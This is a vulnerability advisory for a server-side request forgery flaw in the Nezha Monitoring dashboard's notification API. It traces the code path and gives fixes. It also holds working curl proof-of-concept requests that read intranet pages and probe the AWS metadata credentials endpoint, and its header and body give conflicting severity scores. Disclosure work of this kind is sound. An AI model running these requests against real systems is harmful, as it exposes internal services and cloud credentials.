# [H] Nezha Monitoring: RoleMember-reachable SSRF with full response-body reflection via POST /api/v1/notification

## Summary
Severity: High
Advisory: GHSA-w4g9-mxgg-j532
CVE: CVE-2026-46717
CWE: CWE-863, CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-05-23
Source: https://github.com/advisories/GHSA-w4g9-mxgg-j532
Type: github-advisory

## Affected
- Go: `github.com/nezhahq/nezha` — affected >=1.4.0 <1.14.15-0.20260517022419-d06d539d34c1

## Details
## Summary

nezha's dashboard supports two user roles: `RoleAdmin` (Role==0) and `RoleMember` (Role==1). The notification routes `POST /api/v1/notification` and `PATCH /api/v1/notification/:id` are wired through `commonHandler` rather than `adminHandler` — so a `RoleMember` user can call them. These handlers synchronously `Send()` an HTTP request to a user-controlled URL and reflect the *entire* response body (no size limit) back to the caller on any non-2xx response.

Net effect: a low-privilege `RoleMember` can read intranet HTTP response bodies via the dashboard's hub.

## Affected versions

Commit `50dc8e660326b9f22990898142c58b7a5312b42a` and earlier on `master`.

## Reachability chain

```
cmd/dashboard/controller/controller.go:121-122
    auth.GET("/notification", listHandler(listNotification))
    auth.POST("/notification", commonHandler(createNotification))   // <-- commonHandler, not adminHandler
```

For comparison, `/user` routes ARE gated by `adminHandler`:

```
auth.GET("/user", adminHandler(listUser))
auth.POST("/user", adminHandler(createUser))
auth.POST("/batch-delete/user", adminHandler(batchDeleteUser))
```

`adminHandler` (controller.go:220-236) explicitly enforces `user.Role.IsAdmin()`. `commonHandler` (controller.go:214-218) does not.

## The vulnerable handler

```go
// cmd/dashboard/controller/notification.go:46-83
func createNotification(c *gin.Context) (uint64, error) {
    var nf model.NotificationForm
    if err := c.ShouldBindJSON(&nf); err != nil { return 0, err }
    var n model.Notification
    n.UserID = getUid(c)
    n.Name = nf.Name
    n.RequestMethod = nf.RequestMethod
    n.RequestType = nf.RequestType
    n.RequestHeader = nf.RequestHeader
    n.RequestBody = nf.RequestBody
    n.URL = nf.URL
    ...
    ns := model.NotificationServerBundle{Notification: &n, Server: nil, Loc: singleton.Loc}
    if !nf.SkipCheck {
        if err := ns.Send(singleton.Localizer.T("a test message")); err != nil {
            return 0, err   // <-- err.Error() reflects up to caller via newErrorResponse
        }
    }
    ...
}
```

Identical pattern in `updateNotification` (PATCH /notification/:id) at lines 97-146.

## The reflection sink

```go
// model/notification.go:113-159
func (ns *NotificationServerBundle) Send(message string) error {
    var client *http.Client
    n := ns.Notification
    if n.VerifyTLS != nil && *n.VerifyTLS {
        client = utils.HttpClient
    } else {
        client = utils.HttpClientSkipTlsVerify
    }
    reqBody, err := ns.reqBody(message)
    if err != nil { return err }
    reqMethod, err := n.reqMethod()
    if err != nil { return err }
    req, err := http.NewRequest(reqMethod, ns.reqURL(message), strings.NewReader(reqBody))
    if err != nil { return err }
    n.setContentType(req)
    if err := n.setRequestHeader(req); err != nil { return err }
    resp, err := client.Do(req)
    if err != nil { return err }
    defer func() { _ = resp.Body.Close() }()
    if resp.StatusCode < 200 || resp.StatusCode > 299 {
        body, _ := io.ReadAll(resp.Body)   // <-- NO io.LimitReader
        return fmt.Errorf("%d@%s %s", resp.StatusCode, resp.Status, string(body))
    } else {
        _, _ = io.Copy(io.Discard, resp.Body)
    }
    return nil
}
```

The full body (no size limit) is concatenated into an error string. That error flows through `commonHandler → handle() → newErrorResponse(err) → c.JSON(http.StatusOK, ...)`. The intranet response body is JSON-encoded back to the `RoleMember` caller.

Additional wrinkle: `client = utils.HttpClientSkipTlsVerify` when `VerifyTLS` is false — attacker-controlled. So the SSRF works against TLS endpoints too, ignoring cert validation.

## PoC

### A. Read intranet admin-panel response body

```bash
curl -X POST -H "Authorization: Bearer <member-jwt>" \
  -H "Content-Type: application/json" \
  -d '{"name":"x","url":"http://192.168.1.1/admin/index.html","request_method":1,"request_type":1,"verify_tls":false,"skip_check":false}' \
  http://nezha-dashboard.example.com/api/v1/notification
```

Response:
```json
{"success":false,"error":"401@Unauthorized <full HTML body of the admin login page, no size limit>"}
```

### B. AWS IMDSv2 reachability + body leak

```bash
curl -X POST -H "Authorization: Bearer <member-jwt>" \
  -H "Content-Type: application/json" \
  -d '{"name":"x","url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","request_method":1,"request_type":1,"verify_tls":false,"skip_check":false}' \
  http://nezha-dashboard.example.com/api/v1/notification
```

IMDSv2 returns 401 with a body explaining the missing token; that body is reflected.

### C. DoS via large internal file

Because the body is read via unbounded `io.ReadAll`, a `RoleMember` pointing at any internal large-file URL (logs, package mirrors, video) blows up dashboard memory.

## Suggested fix

1. **Switch /notification routes to `adminHandler`.** Same fix for `/alert-rule`, `/cron`, `/ddns` if they also issue user-URL requests synchronously. Compare with how `/user` is already guarded.

   ```go
   auth.POST("/notification", adminHandler(createNotification))
   auth.PATCH("/notification/:id", adminHandler(updateNotification))
   ```

2. **SSRF-harden `NotificationServerBundle.Send()`:**
   - Resolve URL host once via `net.LookupIP`; refuse private/loopback/link-local/CGNAT.
   - Pin `http.Transport.DialContext` to the resolved IP — closes DNS-rebinding TOCTOU.
   - Refuse non-http(s) schemes.

3. **Cap response body**: `io.LimitReader(resp.Body, 4096)`. 4 KB is plenty for surfacing webhook errors.

4. **Reconsider `VerifyTLS=false` toggle on RoleMember-reachable paths** — if the route remains member-reachable, at minimum cert validation should be enforced.

## Severity

- **CVSS 3.1:** Medium — `AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:L` ≈ 6.4. PR:L because attacker needs a `RoleMember` account (admin-issued). C:L because intranet response bodies can be read but typically not full credentials. A:L because of the unbounded body-read DoS.
- **Auth:** authenticated `RoleMember` (Role == 1).

## Reproduction environment

- Tested against: `nezhahq/nezha:v0.x` (commit `50dc8e660326b9f22990898142c58b7a5312b42a`).
- Code locations:
  - Handler: `cmd/dashboard/controller/notification.go:46-83, 97-146`
  - Sink: `model/notification.go:113-159`
  - Auth gate: `cmd/dashboard/controller/controller.go:121-122` (commonHandler), 214-236 (handler defs)

## Reporter

Eddie Ran. Filed via reporter API (PVR enabled). nezha's `SECURITY.md` mentions email `hi@nai.ba` for vulnerability reports — happy to also send via email if the maintainer prefers.

## References
- https://github.com/nezhahq/nezha/security/advisories/GHSA-w4g9-mxgg-j532
- https://nvd.nist.gov/vuln/detail/CVE-2026-46717
- https://github.com/nezhahq/nezha/commit/d06d539d34c143d842b91e2a64326e8c8f9bc405
- https://github.com/nezhahq/nezha
